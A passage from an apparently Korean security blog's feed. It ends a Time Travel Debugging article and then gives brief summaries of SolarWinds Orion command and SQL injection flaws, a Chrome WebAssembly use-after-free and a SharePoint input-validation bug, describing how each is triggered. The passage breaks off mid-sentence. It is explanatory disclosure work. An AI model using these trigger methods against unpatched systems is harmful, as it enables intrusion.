TTP)&#xC774;&#xB780; &#xAC12;&#xC774; &#xB9E4;&#xACA8;&#xC9C0;&#xB294;&#xB370; break point&#xC758; &#xC0C1;&#xC704; &#xD638;&#xD658;&#xC774;&#xB77C; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/11.png" alt></p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>fabulous()</code>&#xB77C;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC788;&#xACE0; &#xC774; &#xD568;&#xC218;&#xAC00; 16&#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xB41C; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;. &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC704;&#xD574; <code>fabulous()</code>&#xD568;&#xC218; &#xC5D4;&#xD2B8;&#xB9AC;&#xC5D0; break point&#xB97C; &#xAC78;&#xC5C8;&#xB2E4;&#xBA74; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC2DC;&#xC791; &#xC2DC;&#xC810;&#xBD80;&#xD130; &#xBC84;&#xADF8; &#xBC1C;&#xC0DD; &#xC704;&#xCE58;&#xAE4C;&#xC9C0; &#xD574;&#xB2F9; break point&#xC5D0; &#xCD1D; 16&#xBC88; &#xAC78;&#xB824;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/12.png" alt></p><p>&#xBC18;&#xBA74; Time Travel Position&#xC740; &#xAC19;&#xC740; &#xD568;&#xC218;&#xC758; &#xAC19;&#xC740; instruction&#xC77C;&#xC9C0;&#xB77C;&#xB3C4; &#xC2E4;&#xD589; &#xC2DC;&#xC810;&#xC774; &#xB2E4;&#xB974;&#xB2E4;&#xBA74; &#xB2E4;&#xB978; &#xAC12;&#xC774; &#xB9E4;&#xACA8;&#xC9D1;&#xB2C8;&#xB2E4;. <code>!tt</code>&#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC784;&#xC758;&#xC758; TTP&#xB85C; &#xC774;&#xB3D9;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xD2B9;&#xC815; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xB418;&#xB3CC;&#xB9B4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/13.png" alt></p><p>MS&#xC5D0;&#xC11C; &#xB0B4;&#xC138;&#xC6B0;&#xB294; TTD&#xC758; &#xC7A5;&#xC810; &#xC911; &#xC81C;&#xAC00; &#xB2E8;&#xC5F0; &#xCD5C;&#xACE0;&#xB77C; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC740; &#xBC14;&#xB85C; &#xD0C0;&#xC784;&#xB77C;&#xC778;&#xC785;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C;&#xC5D4; &#xB3D9;&#xC601;&#xC0C1; &#xC7AC;&#xC0DD; &#xBC14;&#xCC98;&#xB7FC; &#xB9C8;&#xC6B0;&#xC2A4;&#xB85C; &#xB4DC;&#xB798;&#xADF8;&#xD558;&#xAC70;&#xB098; &#xD074;&#xB9AD;&#xD574;&#xC11C; &#xC6D0;&#xD558;&#xB294; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xAC08; &#xC218; &#xC788;&#xC744; &#xC904; &#xC54C;&#xC558;&#xB294;&#xB370; &#xBC18;&#xC740; &#xB9DE;&#xACE0; &#xBC18;&#xC740; &#xD2C0;&#xB9B0; &#xC0DD;&#xAC01;&#xC774;&#xB354;&#xAD70;&#xC694;. &#xC804;&#xCCB4; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xD750;&#xB984; &#xC911; &#xC8FC;&#xC694; &#xC774;&#xBCA4;&#xD2B8;(Exception, Break Point, Function Call, Memory Access)&#xC758; &#xC704;&#xCE58;&#xB97C; &#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xD574; &#xC8FC;&#xBA70; &#xD0C0;&#xC784;&#xB77C;&#xC778;&#xC5D0; &#xD45C;&#xC2DC;&#xB41C; &#xAC01; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xBA74; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xD574;&#xB2F9; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC678;&#xC758; &#xACF3;&#xC740; &#xD074;&#xB9AD;&#xD574;&#xB3C4; &#xC774;&#xB3D9; &#xC548;&#xD569;&#xB2C8;&#xB2E4;. &#x314E;&#x314E;;; &#xB108;&#xBB34; &#xAE30;&#xB300;&#xAC00; &#xCEF8;&#xB098;?</p><p><img src="/2021/01/24/fabu1ous/ttd-1/14.png" alt></p><p>&#xC774;&#xBCA4;&#xD2B8; &#xC911; Memory Access &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC5D4; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xC5D0; &#xD2B9;&#xC815; &#xB3D9;&#xC791;(RWX)&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C8; &#xB54C;&#xB9C8;&#xB2E4; &#xD0C0;&#xC784;&#xB77C;&#xC778;&#xC5D0; &#xAE30;&#xB85D;&#xB418;&#xB3C4;&#xB85D; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xAC19;&#xC740; &#xBC84;&#xADF8;&#xB97C; &#xCC3E;&#xC744; &#xB54C; &#xC815;&#xB9D0; &#xC720;&#xC6A9;&#xD558;&#xACA0;&#xC8E0;? &#xBBF8;&#xB514;&#xC5B4; &#xD50C;&#xB808;&#xC774;&#xC5B4; &#xB531; &#xB300;</p><h1 id="&#xB2E8;&#xC810;"><a href="#&#xB2E8;&#xC810;" class="headerlink" title="&#xB2E8;&#xC810;"></a>&#xB2E8;&#xC810;</h1><p><img src="/2021/01/24/fabu1ous/ttd-1/15.png" alt></p><p>&#xBB50;&#x2026; &#xC0AC;&#xC2E4; &#xB2E8;&#xC810;&#xC774;&#xB77C;&#xBA74; &#xB2E8;&#xC810;&#xC774;&#xC9C0;&#xB9CC; &#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xC7A5;&#xC810;&#xB4E4;&#xC5D0; &#xBE44;&#xD558;&#xBA74; &#xC774; &#xC815;&#xB3C4;&#xB294; &#xCDA9;&#xBD84;&#xD788; &#xAC10;&#xC218;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xBD05;&#xB2C8;&#xB2E4;.</p><h2 id="Trace-File-&#xD06C;&#xAE30;"><a href="#Trace-File-&#xD06C;&#xAE30;" class="headerlink" title="Trace File &#xD06C;&#xAE30;"></a>Trace File &#xD06C;&#xAE30;</h2><p>&#xC704;&#xC5D0;&#xC11C; &#xC7AC;&#xD604;&#xC5D0; 3~4&#xCD08; &#xAC78;&#xB9AC;&#xB294; &#xBC84;&#xADF8;&#xB97C; &#xB179;&#xD654;&#xD55C; &#xACB0;&#xACFC;&#xB85C; 2GB &#xC815;&#xB3C4;&#xC758; &#xB514;&#xC2A4;&#xD06C; &#xC6A9;&#xB7C9;&#xC744; &#xCC28;&#xC9C0;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC5C8;&#xC8E0;? &#xB9CC;&#xC57D; &#xBC84;&#xADF8; &#xC7AC;&#xD604;&#xC5D0;&#xB9CC; &#xBA87;&#xC2ED; &#xBD84;&#xC744; &#xC18C;&#xBAA8;&#xD55C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xC5B4;&#xD6C4;&#x2026;</p><h2 id="&#xB179;&#xD654;&#xC911;-&#xC624;&#xBC84;&#xD5E4;&#xB4DC;"><a href="#&#xB179;&#xD654;&#xC911;-&#xC624;&#xBC84;&#xD5E4;&#xB4DC;" class="headerlink" title="&#xB179;&#xD654;&#xC911; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;"></a>&#xB179;&#xD654;&#xC911; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;</h2><p>&#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC0AC;&#xC591;&#xC774;&#xB098; &#xB179;&#xD654; &#xC911; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC758; &#xC591;&#xC5D0; &#xB530;&#xB77C; &#xCC9C;&#xCC28;&#xB9CC;&#xBCC4;&#xC778; &#xB370;&#xB2E4; &#xBC29;&#xAE08; &#xC5B8;&#xAE09;&#xD55C; Trace File&#xC758; &#xD06C;&#xAE30;&#xC5D0; &#xC9C1;&#xACB0;&#xB418;&#xB294; &#xBB38;&#xC81C;&#xB77C; &#xC6EC;&#xB9CC;&#xD558;&#xBA74; &#xCD5C;&#xB300;&#xD55C; &#xC88B;&#xC740; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xBE68;&#xB9AC; &#xB179;&#xD654;&#xB97C; &#xB05D;&#xB0B4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;.</p><h2 id="Read-only-Debugging"><a href="#Read-only-Debugging" class="headerlink" title="Read-only Debugging"></a>Read-only Debugging</h2><p>&#xB2F9;&#xC5F0;&#xD55C; &#xC774;&#xC57C;&#xAE30;&#xC9C0;&#xB9CC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC2E4;&#xD589;&#xC744; &#xB179;&#xD654;&#xD558;&#xACE0; &#xB3CC;&#xB824;&#xBCF4;&#xB294; &#xAC8C; TTD&#xB77C; &#xB2E4;&#xB978; &#xB514;&#xBC84;&#xAC70;&#xB4E4;&#xCC98;&#xB7FC; &#xD2B9;&#xC815; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB098; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xAC12;&#xC744; &#xC784;&#xC2DC;&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xC791;&#xC5C5;&#xC740; &#xBABB;&#xD574;&#xBD05;&#xB2C8;&#xB2E4;.</p><h2 id="&#xAD8C;&#xD55C;"><a href="#&#xAD8C;&#xD55C;" class="headerlink" title="&#xAD8C;&#xD55C;"></a>&#xAD8C;&#xD55C;</h2><p>&#xC544;&#xC9C1;&#xAE4C;&#xC9C4; TTD&#xB85C; User-mode &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB9CC; &#xB179;&#xD654;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. Kernel-mode &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC548;&#xB41C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p><img src="/2021/01/24/fabu1ous/ttd-1/16.png" alt></p><p>&#xC774;&#xBC88; &#xAE00;&#xC740; &#xAC70;&#xC758; &#xBB50; &#xC5F0;&#xAD6C;&#xAE00;&#xC774;&#xB77C;&#xAE30; &#xBCF4;&#xB2E8; &#xBC88;&#xC5ED;&#xAE00; &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xB05D;&#xB09C; &#xAC70; &#xAC19;&#xB124;&#xC694;. &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC120; &#xC2E4;&#xC81C;&#xB85C; &#xBC84;&#xADF8;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB294; &#xC2E4;&#xC2B5;&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB9C8; &#xAD6C;&#xBC84;&#xC804; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBC84;&#xADF8;&#xB098; MSDOCS&#xC5D0;&#xC11C; TTD &#xC5F0;&#xC2B5;&#xC6A9;&#xC73C;&#xB85C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB2C8;&#xBA74; &#xC544;&#xC608; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xBD84;&#xC11D;&#xD574; &#xBCFC; &#xC218;&#xB3C4; &#xC788;&#xACE0;, &#xC544;&#xC9C1; &#xC815;&#xD574;&#xC9C4; &#xAC74; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB54C;&#xAE4C;&#xC9C0; &#xC800;&#xB294; &#xD06C;&#xB798;&#xC26C; &#xBD84;&#xC11D;&#xD558;&#xBA74;&#xC11C; TTD&#xB97C; &#xC775;&#xD600;&#xC62C;&#xAC8C;&#xC694;. &#xCDE8;&#xC57D;&#xC810;&#xB3C4; &#xCC3E;&#xACE0;&#x2026; &#x314E;&#x314E;;;</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windbg</tag>
      
      <tag>time travel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Three Bugs in Orion&#39;s belt</title>
    <link href="/2021/01/23/fabu1ous/2021-01-23/"/>
    <url>/2021/01/23/fabu1ous/2021-01-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/1/20/three-bugs-in-orions-belt-chaining-multiple-bugs-for-unauthenticated-rce-in-the-solarwinds-orion-platform">Three bugs in orion&#x2019;s belt: Chaining multiple bugs for rce</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>SolarWinds Orion Platform</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ZDI&#xC5D0;&#xC11C; <a href="https://www.solarwinds.com/securityadvisory#anchor1">SunBurst</a> &#xC0AC;&#xAC74;&#xACFC; &#xAD00;&#xB828;&#xB41C; 3&#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xB97C; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li><p>CVE-2020-14005</p><p>Alert Management &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; SolarWinds &#xC0AC;&#xC6A9;&#xC790;&#xB294; SolarWinds Orion Platform&#xC758; web-based GUI &#xD639;&#xC740; REST API&#xB97C; &#xD1B5;&#xD574; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Alert Management &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xCC98;&#xB9AC;&#xD560; VBS script&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;, &#xC774; VBS script&#xB97C; &#xD574;&#xC11D;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD560; interpreter&#xC758; &#xACBD;&#xB85C; &#xB610;&#xD55C; API request&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC870;&#xC791;&#xD574; &#xC784;&#xC758;&#xB85C; &#xC124;&#xC815;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; interpreter &#xB300;&#xC2E0; cmd.exe&#xB97C; &#xC2E4;&#xD589;&#xD574; command injection&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul><ul><li><p>CVE-2020-27869</p><p>&#xD2B9;&#xC815; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC774;&#xBCA4;&#xD2B8; &#xBC1C;&#xC0DD; &#xC2DC; &#xC11C;&#xBC84;&#xB85C; &#xBCF4;&#xB0BC; GET &#xD639;&#xC740; POST Request&#xB97C; Configure Action &#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; SQL injection&#xC774; &#xAC00;&#xB2A5;&#xD574; &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml">...<span class="hljs-keyword">if</span> (messageWithMacros.<span class="hljs-constructor">Contains(<span class="hljs-string">&quot;${SQL:&quot;</span>)</span>){                     MacroParser.<span class="hljs-constructor">PrepareMacroStringForSQL(<span class="hljs-params">ref</span> <span class="hljs-params">messageWithMacros</span>)</span>;}...</code></pre><p>&#xC11C;&#xBC84;&#xC5D0; &#xBCF4;&#xB0BC; POST request&#xB97C; &#xC784;&#xC758;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xC774; <code>${SQL:</code>&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBA74; &#xADF8; &#xB4A4;&#xC5D0; &#xB530;&#xB77C;&#xC624;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC744; SQL statement&#xB85C; &#xC778;&#xC2DD;&#xD558;&#xACE0; &#xCC98;&#xB9AC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p></li></ul><ul><li><a href="https://hackyboiz.github.io/2021/01/02/fabu1ous/2021-01-02/">CVE-2020-10148</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15994 : Chrome WebAssembly Engine UAF 취약점</title>
    <link href="/2021/01/22/l0ch/2021-01-22/"/>
    <url>/2021/01/22/l0ch/2021-01-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=5">Exploiting CVE-2020-15994 Chrome WebAssembly Engine UAF Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome WebAssembly</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Chrome&#xC758; V8 WebAssembly &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; UAF &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC0C1;&#xC138; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. WebAssembly&#xB294; JS&#xC758; &#xB2E8;&#xC810;&#xC744; &#xBCF4;&#xC644;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xC800;&#xC218;&#xC900; &#xC5B8;&#xC5B4;&#xB85C; &#xC791;&#xC131;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD574; &#xB124;&#xC774;&#xD2F0;&#xBE0C;&#xB85C; &#xB3D9;&#xC791;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xAE30;&#xC220; &#xD45C;&#xC900;&#xC785;&#xB2C8;&#xB2E4;.</p><p>WebAssembly&#xC758; <code>AsyncCompileJob</code> &#xAC1D;&#xCCB4;&#xB294; <code>WebAssembly.instantiateStreaming</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAE30;&#xBCF8; V8 &#xAC1D;&#xCCB4;&#xC774;&#xBA70; WebAssembly&#xC758; &#xBE44;&#xB3D9;&#xAE30; &#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>AsyncCompileJob::FinishModule</code> - &#xCEF4;&#xD30C;&#xC77C;&#xB41C; WebAssembly &#xCF54;&#xB4DC;&#xB97C; Javascript &#xAC1D;&#xCCB4;&#xB85C; &#xC778;&#xC2A4;&#xD134;&#xC2A4; &#xD654;&#xD568;<br><code>AsyncCompileJob::Abort</code> - WebAssembly &#xCF54;&#xB4DC; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xC2E4;&#xD328; &#xC2DC; &#xD638;&#xCD9C;&#xB418;&#xBA70; &#xBAA8;&#xB4E0; &#xCEF4;&#xD30C;&#xC77C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xCDE8;&#xC18C;&#xD568;<br>&#xC704; &#xB450; &#xD568;&#xC218;&#xB294; &#xBAA8;&#xB450; <code>AsyncCompileJob</code> &#xAC1D;&#xCCB4;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>WebAssembly.instantiateStreaming</code> &#xD568;&#xC218;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; WebAssembly &#xCF54;&#xB4DC;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xB294; &#xACBD;&#xC6B0; WebAssembly &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; Javascript &#xD568;&#xC218; &#xBC0F; &#xAC1D;&#xCCB4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB85C; <code>importObject</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>importObject</code>&#xC5D0; Getter&#xB97C; &#xC815;&#xC758;&#xD558;&#xBA74; <code>InstanceBuilder::SanitizeImports</code> &#xD568;&#xC218;&#xB294; Getter &#xD568;&#xC218;&#xB97C; &#xCF5C;&#xBC31;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Getter&#xB97C;  <code>AsyncCompileJob::Abort</code> &#xB85C; &#xC815;&#xC758;&#xD574; &#xCF5C;&#xBC31; &#xD568;&#xC218;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xBA74; <code>AsyncCompileJob::FinishModule</code> &#xD568;&#xC218; &#xC774;&#xD6C4; &#xD574;&#xC81C;&#xB41C; <code>AsyncCompileJob</code> &#xAC1D;&#xCCB4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC5B4; UAF&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>uaf</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>webassembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1456 : Unvalidated User Input in MS SharePoint</title>
    <link href="/2021/01/21/idioth/2021-01-21/"/>
    <url>/2021/01/21/idioth/2021-01-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://slashcrypto.org/2021/01/15/CVE-2020-1456/">INSERTION OF MALICIOUS LINKS FOR EXECUTION IN PROFILE PICTURE - UNVALIDATED USER INPUT IN MS SHAREPOINT 2019 (CVE-2020-1456)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2020&#xB144; 7&#xC6D4; 14&#xC77C; &#xD328;&#xCE58; &#xC774;&#xC804; &#xBC84;&#xC804;<ul><li>Microsoft SharePoint Server 2010 Service Pack 2</li><li>Microsoft SharePoint Server 2019</li><li>Microsoft SharePoint Enterprise Server 2013 Service Pack 1</li><li>Microsoft SharePoint Enterprise Server 2016</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint Server&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xD504;&#xB85C;&#xD544; &#xC0AC;&#xC9C4;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xB9C1;&#xD06C;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xD544; &#xC0AC;&#xC9C4;&#xC774; &#xC0BD;&#xC785;&#xB41C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xBC29;&#xBB38;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xACF5;&#xACA9;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. SharePoint&#xB294; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8; &#xC624;&#xD53C;&#xC2A4; &#xC11C;&#xBC84; &#xC81C;&#xD488;&#xAD70;&#xC758; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xD50C;&#xB7AB;&#xD3FC;&#xC73C;&#xB85C; &#xAE30;&#xC5C5;&#xC774;&#xB098; &#xC870;&#xC9C1;&#xC5D0;&#xC11C; &#xACF5;&#xB3D9; &#xC791;&#xC5C5;, &#xC815;&#xBCF4; &#xC81C;&#xACF5; &#xB4F1;&#xC758; &#xD611;&#xC5C5; &#xC0AC;&#xC774;&#xD2B8; &#xAD6C;&#xCD95;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>SharePoint&#xC758; &#xC720;&#xC800; &#xD504;&#xB85C;&#xD544; &#xC124;&#xC815;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74;, &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xD504;&#xB85C;&#xD544; &#xC0AC;&#xC9C4;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xD544; &#xC0AC;&#xC9C4;&#xC744; &#xC62C;&#xB9AC;&#xACE0; &#xC801;&#xC6A9;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xBAA8;&#xB4E0; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xC800;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC774; &#xC800;&#xC7A5;&#xB420; &#xB54C; POST request&#xB85C; &#xC218;&#xD589;&#xB418;&#xBA70; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB3C4;&#xBA54;&#xC778;&#xC5D0; 